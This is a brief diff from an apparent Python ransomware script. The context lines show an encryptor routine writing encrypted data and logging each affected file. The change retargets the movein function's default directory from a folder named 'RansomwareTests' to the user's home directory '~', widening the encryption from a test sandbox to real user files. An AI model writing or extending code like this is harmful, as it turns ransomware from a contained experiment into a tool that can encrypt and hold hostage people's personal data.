@@ -73,7 +73,7 @@ def encryptor(file):
         tf.write(crypto)
         encf.write(str(file)+"\n")
 
-def movein(dirpath='/home/ashwin/RansomwareTests'):
+def movein(dirpath='~'):
     for each in listdir(dirpath):
         if each[0]=='.':
             continue
